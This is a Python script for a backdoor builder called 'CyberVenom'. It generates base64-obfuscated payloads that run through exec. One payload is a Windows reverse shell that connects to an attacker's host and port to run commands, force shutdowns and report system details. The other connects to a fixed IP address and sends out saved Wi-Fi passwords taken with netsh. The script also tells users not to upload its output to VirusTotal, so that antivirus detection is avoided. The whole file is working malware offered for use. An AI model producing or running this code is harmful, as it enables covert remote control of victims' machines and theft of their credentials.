try:
    import optparse
    from colorama import Fore, Back, Style, init
    import subprocess
    import time
    import base64
    import os
    init()
    red = Fore.RED
    reset = Fore.RESET
    parser = optparse.OptionParser()
    parser.add_option("-p", "--payload", dest="payload",
                      help="Define the payload. Type --current payloads to get a list")
    parser.add_option("--LHOST", dest="lhost", help="The attacker's Ip. Your ip")
    parser.add_option("--LPORT", dest="lport", help="The listener port. specify any port")
    parser.add_option("-f", "--filename", dest="file", help="The backdoor file you want to be created")
    parser.add_option("--current ", dest="list", help="List out the current things. --current modules for modules")
    options, args = parser.parse_args()
    if options.list == "payloads":
        print("windows/CyberShell/rev_tcp       -      " + red + "strong" + reset)
        print("malware/wifi/password            -      " + Fore.GREEN + "good" + reset)
    elif options.payload == "windows/CyberShell/rev_tcp":
        print(red)
        print(r"""\
                                                  ----.                                                 
                                                  ::::.                                                 
                               ``                 `````         ``  `                                   
                             `--:--`       .::--.`----. `--:-.-:::..----      .----`  `--::---------.   
                              `::::-`     `::::-` ::::. `::::-----`.:::-`     .::::` .::::..........`   
                               .::::-`   `::::-` `::::. `::::.     .:::-`     .::::` -:::-`             
                                .::::.  `-:::-`  `::::. `::::.     .:::-`     .::::` `-:::--------..`   
    `-:/://::-```.-::::.`:/:`   `-::::``-::::`    ::::. `::::.     -:::-`     .::::`  `.--------::::-`  
    `:o+/:--:/+syyyyyyyy+:ys`    `-:::--::::`     ::::. `::::.     -:::-`     .::::`            `-:::-  
       `:oyyyyyyyyyyyyyyyyys`     `-:::::::.      ::::. `::::.     .:::::------::::` `.````````.-::::`  
     `` ```-/osyyyyyyyyyyyys`      `-:::::.       ::::. `-:::.      `.-::::::::::::` .::::::::::::--`   
    `/so/-`` ``.:+syyyyyyyys`         ```         ````   ```             ``````````   ```````````       
     /yyyyyo+:.````+yyyyyyys`      `  ``                           ```                          `````   
     /yyyyyyyyys.`oyyyyyyyys`     `/ssss.                          :ssss.                      `osss+`  
     /yyyyyyyyo.-syyyyyyyyys`      /yyyy.                          :yyyy.                      `syyyo   
     /yyyyyyy+`/yyyyyyyyyyyo`    ``/yyyy.```       `````````     ``:yyyy.`````````````````     `syyyo   
     /yyyyyy:.+yyyyyyys+/:.`    .ssyyyyyssss:` `:/osyyyyyso+:`` .ssyyyyyssss/.ssssssssssss+:`` `syyyo   
     /yyyyo..syso/:-.````-::`   .oosyyyyoooo-`/syyyyo+++oyyyys/`.oosyyyyoooo:.osssoosossyyyys.``syyyo   
     -///:``-.`     `.-:///:`     `/yyyy.   `oyyyy+.    `.+yyyy+`  :yyyy.     `     ````.syyy+``syyyo   
                                   /yyyy.   -yyyys`       `syyyy.  :yyyy.    `.://///+/++syyyo``syyyo   
                                   /yyyy.   -yyyyo`       `oyyyy-  :yyyy.  ``+yyyyyssssssyyyyo``syyyo   
                                  `/yyyy-`  `syyyy/``    `-yyyys.  :yyyy-```-yyyyo```````oyyyo``syyyo   
                                   -yyyyso++-.oyyyys/:--:oyyyys-`  -yyyyyo++/syyyyo++++++syyyo``syyyo   
                                   `-oyyyyyy:``-+syyyyyyyyys+:`    `-osyyyyy/.+syyyyyyyyyyyyyo``syyyo`  
                                     ``.....`    ``.-----.``         ```.`..`  ```.````````..`  ``..`  



                   """)
        agreement = input("You must never upload these backdoors to virus total.com. If you do you won't be able to use"
                          " these backdoors again because virus total shares the information reguarding these backdoors "
                          "with antivirus softwares. do you proceed Y or N >  ")
        print(reset)
        if agreement == "Y" or agreement == "y":
            with open(options.file, "x") as backdoor:
                payload = (r"""
try:
    from requests import get
    import platform, re, uuid, pickle, psutil, logging
    import subprocess
    import socket
    import os
    import pickle
    from colorama import *
    init()
    def execute_sys_command(command):
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        data = output + output_error
        connection.send(data)


    def change_dir(dir):
        os.chdir(dir)
        return "[+] Changing working directory to " + dir

    host = '""" + options.lhost + """'""" + """
    port = """ + options.lport + """
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((host, port))
    while True:
        recieved = connection.recv(1048576)
        command = recieved.decode()
        if "ChangeDir " in command:
            directory = command.replace("ChangeDir ", "")
            result = change_dir(dir=directory)
            result = result.encode()
            connection.send(result)
        elif command == "Shutdown":
            success = "[+] Target going to shutdown "
            success = success.encode()
            connection.send(success)
            subprocess.call("shutdown /s /f", shell=True)
        elif command == "Restart":
            success = "[+] Target going to restart "
            success = success.encode()
            connection.send(success)
            subprocess.call("shutdown /r /f", shell=True)
        elif command == "Exit.session":
            closing = "[+] Session is going to close"
            closing = closing.encode()
            connection.send(closing)
            connection.close()
        elif command == "PublicIp":
            ip_addr = get('https://api.ipify.org').text
            ip = "[+] The victim's public ip is " + ip_addr
            ip = ip.encode()
            connection.send(ip)
        elif command == "SysInfo" or command == "Sysinfo" or command == "sysinfo" or command == "sysInfo":
            def getSystemInfo():
                try:
                    os = "Platform = " + platform.system()
                    release = ", Platform release = " + platform.release()
                    version = ", Platform version = " + platform.version()
                    archit = ", Architecture = " + platform.machine()
                    hostname = ", Hostname = " + socket.gethostname()
                    ip = ", Ip address = " + socket.gethostbyname(socket.gethostname())
                    mac = ", Mac address = " + ':'.join(re.findall('..', '%012x' % uuid.getnode()))
                    processor = ", Processor = " + platform.processor()
                    ram = ", Ram = " + str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
                    full = os + release + version + archit + hostname + ip + mac + processor + ram
                    full = full.encode()
                    connection.send(full)

                except Exception as e:
                    logging.exception(e)


            getSystemInfo()
        else:
            execute_sys_command(command=command)
except KeyboardInterrupt:
    print(Fore.RED)
    print("KeyBoardInterrupt")
    print(Fore.RESET)
    quit()
except ConnectionAbortedError:
    print(Fore.RED)
    print("Connection was aborted")
    print(Fore.RESET)
    quit()
except ConnectionRefusedError:
    print(Fore.RED)
    print("Connection refused by target")
    print(Fore.RESET)
    quit()
    """)
                payload_bytes = payload.encode('utf-8')
                base64_bytes = base64.b64encode(payload_bytes)
                base64_payload = base64_bytes.decode('utf-8')
                backdoor.write(r"""
payload = '""" + base64_payload + """'""" + """ 
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(payload)[0]))
""")
                time.sleep(5)
                print("[+] Finished writing the payload to " + options.file)
    elif options.payload == "malware/wifi/password":
        print(red)
        print(r"""\
                                                          ----.                                                 
                                                          ::::.                                                 
                                       ``                 `````         ``  `                                   
                                     `--:--`       .::--.`----. `--:-.-:::..----      .----`  `--::---------.   
                                      `::::-`     `::::-` ::::. `::::-----`.:::-`     .::::` .::::..........`   
                                       .::::-`   `::::-` `::::. `::::.     .:::-`     .::::` -:::-`             
                                        .::::.  `-:::-`  `::::. `::::.     .:::-`     .::::` `-:::--------..`   
            `-:/://::-```.-::::.`:/:`   `-::::``-::::`    ::::. `::::.     -:::-`     .::::`  `.--------::::-`  
            `:o+/:--:/+syyyyyyyy+:ys`    `-:::--::::`     ::::. `::::.     -:::-`     .::::`            `-:::-  
               `:oyyyyyyyyyyyyyyyyys`     `-:::::::.      ::::. `::::.     .:::::------::::` `.````````.-::::`  
             `` ```-/osyyyyyyyyyyyys`      `-:::::.       ::::. `-:::.      `.-::::::::::::` .::::::::::::--`   
            `/so/-`` ``.:+syyyyyyyys`         ```         ````   ```             ``````````   ```````````       
             /yyyyyo+:.````+yyyyyyys`      `  ``                           ```                          `````   
             /yyyyyyyyys.`oyyyyyyyys`     `/ssss.                          :ssss.                      `osss+`  
             /yyyyyyyyo.-syyyyyyyyys`      /yyyy.                          :yyyy.                      `syyyo   
             /yyyyyyy+`/yyyyyyyyyyyo`    ``/yyyy.```       `````````     ``:yyyy.`````````````````     `syyyo   
             /yyyyyy:.+yyyyyyys+/:.`    .ssyyyyyssss:` `:/osyyyyyso+:`` .ssyyyyyssss/.ssssssssssss+:`` `syyyo   
             /yyyyo..syso/:-.````-::`   .oosyyyyoooo-`/syyyyo+++oyyyys/`.oosyyyyoooo:.osssoosossyyyys.``syyyo   
             -///:``-.`     `.-:///:`     `/yyyy.   `oyyyy+.    `.+yyyy+`  :yyyy.     `     ````.syyy+``syyyo   
                                           /yyyy.   -yyyys`       `syyyy.  :yyyy.    `.://///+/++syyyo``syyyo   
                                           /yyyy.   -yyyyo`       `oyyyy-  :yyyy.  ``+yyyyyssssssyyyyo``syyyo   
                                          `/yyyy-`  `syyyy/``    `-yyyys.  :yyyy-```-yyyyo```````oyyyo``syyyo   
                                           -yyyyso++-.oyyyys/:--:oyyyys-`  -yyyyyo++/syyyyo++++++syyyo``syyyo   
                                           `-oyyyyyy:``-+syyyyyyyyys+:`    `-osyyyyy/.+syyyyyyyyyyyyyo``syyyo`  
                                             ``.....`    ``.-----.``         ```.`..`  ```.````````..`  ``..`  



                           """)
        agreement = input("You must never upload these backdoors to virus total.com. If you do you won't be able to use"
                          " these backdoors again because virus total shares the information reguarding these backdoors "
                          "with antivirus softwares. do you proceed Y or N >  ")
        print(reset)
        if agreement == "Y" or agreement == "y":
            with open(options.file, "x") as backdoor_pass:
                payload_2 = (r"""
import subprocess
import socket
command = "netsh wlan show profiles"
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.1.6", 2008))
op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
output = op.stdout.read()
output_error = op.stderr.read()
client.send(output + output_error)
while True:
    data = client.recv(1048576)
    data = data.decode()
    if data == "show profiles" or data == "Show profiles":
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)
    else:
        password = "netsh wlan show profile " + data + " key=clear"
        op = subprocess.Popen(password, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        client.send(output + output_error)
                """)

                payload_bytes = payload_2.encode('utf-8')
                base64_bytes = base64.b64encode(payload_bytes)
                base64_payload = base64_bytes.decode('utf-8')
                backdoor_pass.write(r"""
payload = '""" + base64_payload + """'""" + """
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')(payload)[0]))
    """)
                time.sleep(3)
                print("[+] finished writing the file")

    else:
        print("[+] Wrong parameter for CyberVenom. type python CyberVenom.py -h for more info")
except FileExistsError:
    print("[+] The file name you specified already exists")
    quit()
except KeyboardInterrupt:
    print(red + "KeyBoardInterrupt" + reset)
    quit()
except NameError:
    print("[+] Fill out all the necessary parameters. Type python CyberVenom.py -h for more info")
    quit()
